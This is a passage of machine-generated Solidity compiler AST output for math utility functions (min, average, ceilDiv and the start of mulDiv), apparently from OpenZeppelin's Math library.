ype":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2378,"src":"5719:1:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_bool","typeString":"bool"},{"typeIdentifier":"t_uint256","typeString":"uint256"},{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":2383,"name":"ternary","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2354,"src":"5701:7:6","typeDescriptions":{"typeIdentifier":"t_function_internal_pure$_t_bool_$_t_uint256_$_t_uint256_$returns$_t_uint256_$","typeString":"function (bool,uint256,uint256) pure returns (uint256)"}},"id":2389,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"5701:20:6","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"functionReturnParameters":2382,"id":2390,"nodeType":"Return","src":"5694:27:6"}]},"documentation":{"id":2374,"nodeType":"StructuredDocumentation","src":"5552:60:6","text":" @dev Returns the smallest of two numbers."},"id":2392,"implemented":true,"kind":"function","modifiers":[],"name":"min","nameLocation":"5626:3:6","nodeType":"FunctionDefinition","parameters":{"id":2379,"nodeType":"ParameterList","parameters":[{"constant":false,"id":2376,"mutability":"mutable","name":"a","nameLocation":"5638:1:6","nodeType":"VariableDeclaration","scope":2392,"src":"5630:9:6","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":2375,"name":"uint256","nodeType":"ElementaryTypeName","src":"5630:7:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"},{"constant":false,"id":2378,"mutability":"mutable","name":"b","nameLocation":"5649:1:6","nodeType":"VariableDeclaration","scope":2392,"src":"5641:9:6","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":2377,"name":"uint256","nodeType":"ElementaryTypeName","src":"5641:7:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"5629:22:6"},"returnParameters":{"id":2382,"nodeType":"ParameterList","parameters":[{"constant":false,"id":2381,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":2392,"src":"5675:7:6","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":2380,"name":"uint256","nodeType":"ElementaryTypeName","src":"5675:7:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"5674:9:6"},"scope":3686,"src":"5617:111:6","stateMutability":"pure","virtual":false,"visibility":"internal"},{"body":{"id":2414,"nodeType":"Block","src":"5912:82:6","statements":[{"expression":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":2412,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"components":[{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":2404,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":2402,"name":"a","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2395,"src":"5967:1:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"&","rightExpression":{"id":2403,"name":"b","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2397,"src":"5971:1:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"5967:5:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"id":2405,"isConstant":false,"isInlineArray":false,"isLValue":false,"isPure":false,"lValueRequested":false,"nodeType":"TupleExpression","src":"5966:7:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"+","rightExpression":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":2411,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"components":[{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":2408,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":2406,"name":"a","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2395,"src":"5977:1:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"^","rightExpression":{"id":2407,"name":"b","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2397,"src":"5981:1:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"5977:5:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"id":2409,"isConstant":false,"isInlineArray":false,"isLValue":false,"isPure":false,"lValueRequested":false,"nodeType":"TupleExpression","src":"5976:7:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"/","rightExpression":{"hexValue":"32","id":2410,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"5986:1:6","typeDescriptions":{"typeIdentifier":"t_rational_2_by_1","typeString":"int_const 2"},"value":"2"},"src":"5976:11:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"5966:21:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"functionReturnParameters":2401,"id":2413,"nodeType":"Return","src":"5959:28:6"}]},"documentation":{"id":2393,"nodeType":"StructuredDocumentation","src":"5734:102:6","text":" @dev Returns the average of two numbers. The result is rounded towards\n zero."},"id":2415,"implemented":true,"kind":"function","modifiers":[],"name":"average","nameLocation":"5850:7:6","nodeType":"FunctionDefinition","parameters":{"id":2398,"nodeType":"ParameterList","parameters":[{"constant":false,"id":2395,"mutability":"mutable","name":"a","nameLocation":"5866:1:6","nodeType":"VariableDeclaration","scope":2415,"src":"5858:9:6","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":2394,"name":"uint256","nodeType":"ElementaryTypeName","src":"5858:7:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"},{"constant":false,"id":2397,"mutability":"mutable","name":"b","nameLocation":"5877:1:6","nodeType":"VariableDeclaration","scope":2415,"src":"5869:9:6","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":2396,"name":"uint256","nodeType":"ElementaryTypeName","src":"5869:7:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"5857:22:6"},"returnParameters":{"id":2401,"nodeType":"ParameterList","parameters":[{"constant":false,"id":2400,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":2415,"src":"5903:7:6","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":2399,"name":"uint256","nodeType":"ElementaryTypeName","src":"5903:7:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"5902:9:6"},"scope":3686,"src":"5841:153:6","stateMutability":"pure","virtual":false,"visibility":"internal"},{"body":{"id":2455,"nodeType":"Block","src":"6286:633:6","statements":[{"condition":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":2427,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":2425,"name":"b","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2420,"src":"6300:1:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"==","rightExpression":{"hexValue":"30","id":2426,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"6305:1:6","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"},"src":"6300:6:6","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":2436,"nodeType":"IfStatement","src":"6296:150:6","trueBody":{"id":2435,"nodeType":"Block","src":"6308:138:6","statements":[{"expression":{"arguments":[{"expression":{"id":2431,"name":"Panic","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":229,"src":"6412:5:6","typeDescriptions":{"typeIdentifier":"t_type$_t_contract$_Panic_$229_$","typeString":"type(library Panic)"}},"id":2432,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"memberLocation":"6418:16:6","memberName":"DIVISION_BY_ZERO","nodeType":"MemberAccess","referencedDeclaration":196,"src":"6412:22:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_uint256","typeString":"uint256"}],"expression":{"id":2428,"name":"Panic","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":229,"src":"6400:5:6","typeDescriptions":{"typeIdentifier":"t_type$_t_contract$_Panic_$229_$","typeString":"type(library Panic)"}},"id":2430,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberLocation":"6406:5:6","memberName":"panic","nodeType":"MemberAccess","referencedDeclaration":228,"src":"6400:11:6","typeDescriptions":{"typeIdentifier":"t_function_internal_pure$_t_uint256_$returns$__$","typeString":"function (uint256) pure"}},"id":2433,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"6400:35:6","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":2434,"nodeType":"ExpressionStatement","src":"6400:35:6"}]}},{"id":2454,"nodeType":"UncheckedBlock","src":"6829:84:6","statements":[{"expression":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":2452,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"arguments":[{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":2441,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":2439,"name":"a","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2418,"src":"6876:1:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">","rightExpression":{"hexValue":"30","id":2440,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"6880:1:6","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"},"src":"6876:5:6","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_bool","typeString":"bool"}],"expression":{"id":2437,"name":"SafeCast","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5451,"src":"6860:8:6","typeDescriptions":{"typeIdentifier":"t_type$_t_contract$_SafeCast_$5451_$","typeString":"type(library SafeCast)"}},"id":2438,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberLocation":"6869:6:6","memberName":"toUint","nodeType":"MemberAccess","referencedDeclaration":5450,"src":"6860:15:6","typeDescriptions":{"typeIdentifier":"t_function_internal_pure$_t_bool_$returns$_t_uint256_$","typeString":"function (bool) pure returns (uint256)"}},"id":2442,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"6860:22:6","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"*","rightExpression":{"components":[{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":2450,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":2448,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"components":[{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":2445,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":2443,"name":"a","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2418,"src":"6887:1:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"-","rightExpression":{"hexValue":"31","id":2444,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"6891:1:6","typeDescriptions":{"typeIdentifier":"t_rational_1_by_1","typeString":"int_const 1"},"value":"1"},"src":"6887:5:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"id":2446,"isConstant":false,"isInlineArray":false,"isLValue":false,"isPure":false,"lValueRequested":false,"nodeType":"TupleExpression","src":"6886:7:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"/","rightExpression":{"id":2447,"name":"b","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2420,"src":"6896:1:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"6886:11:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"+","rightExpression":{"hexValue":"31","id":2449,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"6900:1:6","typeDescriptions":{"typeIdentifier":"t_rational_1_by_1","typeString":"int_const 1"},"value":"1"},"src":"6886:15:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"id":2451,"isConstant":false,"isInlineArray":false,"isLValue":false,"isPure":false,"lValueRequested":false,"nodeType":"TupleExpression","src":"6885:17:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"6860:42:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"functionReturnParameters":2424,"id":2453,"nodeType":"Return","src":"6853:49:6"}]}]},"documentation":{"id":2416,"nodeType":"StructuredDocumentation","src":"6000:210:6","text":" @dev Returns the ceiling of the division of two numbers.\n This differs from standard division with `/` in that it rounds towards infinity instead\n of rounding towards zero."},"id":2456,"implemented":true,"kind":"function","modifiers":[],"name":"ceilDiv","nameLocation":"6224:7:6","nodeType":"FunctionDefinition","parameters":{"id":2421,"nodeType":"ParameterList","parameters":[{"constant":false,"id":2418,"mutability":"mutable","name":"a","nameLocation":"6240:1:6","nodeType":"VariableDeclaration","scope":2456,"src":"6232:9:6","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":2417,"name":"uint256","nodeType":"ElementaryTypeName","src":"6232:7:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"},{"constant":false,"id":2420,"mutability":"mutable","name":"b","nameLocation":"6251:1:6","nodeType":"VariableDeclaration","scope":2456,"src":"6243:9:6","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":2419,"name":"uint256","nodeType":"ElementaryTypeName","src":"6243:7:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"6231:22:6"},"returnParameters":{"id":2424,"nodeType":"ParameterList","parameters":[{"constant":false,"id":2423,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":2456,"src":"6277:7:6","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":2422,"name":"uint256","nodeType":"ElementaryTypeName","src":"6277:7:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"6276:9:6"},"scope":3686,"src":"6215:704:6","stateMutability":"pure","virtual":false,"visibility":"internal"},{"body":{"id":2591,"nodeType":"Block","src":"7340:3585:6","statements":[{"id":2590,"nodeType":"UncheckedBlock","src":"7350:3569:6","statements":[{"assignments":[2469,2471],"declarations":[{"constant":false,"id":2469,"mutability":"mutable","name":"high","nameLocation":"7383:4:6","nodeType":"VariableDeclaration","scope":2590,"src":"7375:12:6","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":2468,"name":"uint256","nodeType":"ElementaryTypeName","src":"7375:7:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"},{"constant":false,"id":2471,"mutability":"mutable","name":"low","nameLocation":"7397:3:6","nodeType":"VariableDeclaration","scope":2590,"src":"7389:11:6","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":2470,"name":"uint256","nodeType":"ElementaryTypeName","src":"7389:7:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"id":2476,"initialValue":{"arguments":[{"id":2473,"name":"x","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2459,"src":"7411:1:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},{"id":2474,"name":"y","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2461,"src":"7414:1:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_uint256","typeString":"uint256"},{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":2472,"name":"mul512","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2105,"src":"7404:6:6","typeDescriptions":{"typeIdentifier":"t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$_t_uint256_$","typeString":"function (uint256,uint256) pure returns (uint256,uint256)"}},"id":2475,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"7404:12:6","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$_t_uint256_$_t_uint256_$","typeString":"tuple(uint256,uint256)"}},"nodeType":"VariableDeclarationStatement","src":"7374:42:6"},{"condition":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":2479,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":2477,"name":"high","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2469,"src":"7498:4:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"==","rightExpression":{"hexValue":"30","id":2478,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"7506:1:6","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"},"src":"7498:9:6","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":2485,"nodeType":"IfStatement","src":"7494:365:6","trueBody":{"id":2484,"nodeType":"Block","src":"7509:350:6","statements":[{"expression":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":2482,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":2480,"name":"low","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2471,"src":"7827:3:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"/","rightExpression":{"id":2481,"name":"denominator","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2463,"src":"7833:11:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"7827:17:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"functionReturnParameters":2467,"id":2483,"nodeType":"Return","src":"7820:24:6"}]}},{"condition":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":2488,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":2486,"name":"denominator","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2463,"src":"7969:11:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"<=","rightExpression":{"id":2487,"name":"high","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2469,"src":"7984:4:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"7969:19:6","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":2504,"nodeType":"IfStatement","src":"7965:142:6","trueBody":{"id":2503,"nodeType":"Block","src":"7990:117:6","statements":[{"expression":{"arguments":[{"arguments":[{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":2495,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":2493,"name":"denominator","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2463,"src":"8028:11:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"==","rightExpression":{"hexValue":"30","id":2494,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"8043:1:6","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"},"src":"8028:16:6","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},{"expression":{"id":2496,"name":"Panic","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":229,"src":"8046:5:6","typeDescriptions":{"typeIdentifier":"t_type$_t_contract$_Panic_$229_$","typeString":"type(library Panic)"}},"id":2497,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"memberLocation":"8052:16:6","memberName":"DIVISION_BY_ZERO","nodeType":"MemberAccess","referencedDeclaration":196,"src":"8046:22:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},{"expression":{"id":2498,"name":"Panic","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":229,"src":"8070:5:6","typeDescriptions":{"typeIdentifier":"t_type$_t_contract$_Panic_$229_$","typeString":"type(library Panic)"}},"id":2499,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"memberLocation":"8076:14:6","memberName":"UNDER_OVERFLOW","nodeType":"MemberAccess","referencedDeclaration":192,"src":"8070:20:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_bool","typeString":"bool"},{"typeIdentifier":"t_uint256","typeString":"uint256"},{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":2492,"name":"ternary","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2354,"src":"8020:7:6","typeDescriptions":{"typeIdentifier":"t_function_internal_pure$_t_bool_$_t_uint256_$_t_uint256_$returns$_t_uint256_$","typeString":"function (bool,uint256,uint256) pure returns (uint256)"}},"id":2500,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"8020:71:6","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_uint256","typeString":"uint256"}],"expression":{"id":2489,"name":"Panic","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":229,"src":"8008:5:6","typeDescriptions":{"typeIdentifier":"t_type$_t_contract$_Panic_$229_$","typeString":"type(library Panic)"}},"id":2491,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberLocation":"8014:5:6","memberName":"panic","nodeType":"MemberAccess","referencedDeclaration":228,"src":"8008:11:6","typeDescriptions":{"typeIdentifier":"t_function_internal_pure$_t_uint256_$returns$__$","typeString":"function (uint256) pure"}},"id":2501,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"8008:84:6","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":2502,"nodeType":"ExpressionStatement","src":"8008:84:6"}]}},{"assignments":[2506],"declarations":[{"constant":false,"id":2506,"mutability":"mutable","name":"remainder","nameLocation":"8367:9:6","nodeType":"VariableDeclaration","scope":2590,"src":"8359:17:6","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":2505,"name":"uint256","nodeType":"ElementaryTypeName","src":"8359:7:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"id":2507,"nodeType":"VariableDeclarationStatement","src":"8359:17:6"},{"AST":{"nativeSrc":"8415:283:6","nodeType":"YulBlock","src":"8415:283:6","statements":[{"nativeSrc":"8484:38:6","nodeType":"YulAssignment","src":"8484:38:6","value":{"arguments":[{"name":"x","nativeSrc":"8504:1:6","nodeType":"YulIdentifier","src":"8504:1:6"},{"name":"y","nativeSrc":"8507:1:6","nodeType":"YulIdentifier","src":"8507:1:6"},{"name":"denominator","nativeSrc":"8510:11:6","nodeType":"YulIdentifier","src":"8510:11:6"}],"functionName":{"name":"mulmod","nativeSrc":"8497:6:6","nodeType":"YulIdentifier","src":"8497:6:6"},"nativeSrc":"8497:25:6","nodeType":"YulFunctionCall","src":"8497:25:6"},"variableNames":[{"name":"remainder","nativeSrc":"8484:9:6","nodeType":"YulIdentifier","src":"8484:9:6"}]},{"nativeSrc":"8604:37:6","nodeType":"YulAssignment","src":"8604:37:6","value":{"arguments":[{"name":"high","nativeSrc":"8616:4:6","nodeType":"YulIdentifier","src":"8616:4:6"},{"arguments":[{"name":"remainder","nativeSrc":"8625:9:6","nodeType":"YulIdentifier","src":"8625:9:6"},{"name":"low","nativeSrc":"8636:3:6","nodeType":"YulIdentifier","src":"8636:3:6"}],"functionName":{"name":"gt","nativeSrc":"8622:2:6","nodeType":"YulIdentifier","src":"8622:2:6"},"nativeSrc":"8622:18:6","nodeType":"YulFunctionCall","src":"8622:18:6"}],"functionName":{"name":"sub","nativeSrc":"8612:3:6","nodeType":"YulIdentifier","src":"8612:3:6"},"nativeSrc":"8612:29:6","nodeType":"YulFunctionCall","src":"8612:29:6"},"variableNames":[{"name":"high","nativeSrc":"8604:4:6","nodeType":"YulIdentifier","src":"8604:4:6"}]},{"nativeSrc":"8658:26:6","nodeType":"YulAssignment","src":"8658:26:6","value":{"arguments":[{"name":"low","nativeSrc":"8669:3:6","nodeType":"YulIdentifier","src":"8669:3:6"},{"name":"remainder","nativeSrc":"8674:9:6","nodeType":"YulIdentifier","src":"8674:9:6"}],"functionName":{"name":"sub","nativeSrc":"8665:3:6","nodeType":"YulIdentifier","src":"8665:3:6"},"nativeSrc":"8665:19:6","nodeType":"YulFunctionCall","src":"8665:19:6"},"variableNames":[{"name":"low","nativeSrc":"8658:3:6","nodeType":"YulIdentifier","src":"8658:3:6"}]}]},"evmVersion":"paris","externalReferences":[{"declaration":2463,"isOffset":false,"isSlot":false,"src":"8510:11:6","valueSize":1},{"declaration":2469,"isOffset":false,"isSlot":false,"src":"8604:4:6","valueSize":1},{"declaration":2469,"isOffset":false,"isSlot":false,"src":"8616:4:6","valueSize":1},{"declaration":2471,"isOffset":false,"isSlot":false,"src":"8636:3:6","valueSize":1},{"declaration":2471,"isOffset":false,"isSlot":false,"src":"8658:3:6","valueSize":1},{"declaration":2471,"isOffset":false,"isSlot":false,"src":"8669:3:6","valueSize":1},{"declaration":2506,"isOffset":false,"isSlot":false,"src":"8484:9:6","valueSize":1},{"declaration":2506,"isOffset":false,"isSlot":false,"src":"8625:9:6","valueSize":1},{"declaration":2506,"isOffset":false,"isSlot":false,"src":"8674:9:6","valueSize":1},{"declaration":2459,"isOffset":false,"isSlot":false,"src":"8504:1:6","valueSize":1},{"declaration":2461,"isOffset":false,"isSlot":false,"src":"8507:1:6","valueSize":1}],"flags":["memory-safe"],"id":2508,"nodeType":"InlineAssembly","src":"8390:308:6"},{"assignments":[2510],"declarations":[{"constant":false,"id":2510,"mutability":"mutable","name":"twos","nameLocation":"8910:4:6","nodeType":"VariableDeclaration","scope":2590,"src":"8902:12:6","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":2509,"name":"uint256","nodeType":"ElementaryTypeName","src":"8902:7:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"id":2517,"initialValue":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":2516,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":2511,"name":"denominator","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2463,"src":"8917:11:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"&","rightExpression":{"components":[{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":2514,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"hexValue":"30","id":2512,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"8932:1:6","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 